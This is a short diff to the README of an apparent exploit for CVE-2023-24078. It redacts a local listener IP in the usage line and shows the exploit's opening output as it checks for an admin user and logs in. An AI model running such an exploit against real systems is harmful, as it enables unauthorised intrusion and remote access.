@@ -3,7 +3,7 @@
 Modified version of CVE-2023-24078  exploit
 
 ```
-python3 exploit.py -r 192.168.xxx.xxx -rp xxx -l 192.168.45.168 -p xxx
+python3 exploit.py -r 192.168.xxx.xxx -rp xxx -l 192.168.xxx.xxx -p xxx
 [*] Checking for admin user...
 [+] An admin user does exist..                                                                                                                              
 [+] Logging in...                                                                                                                                           
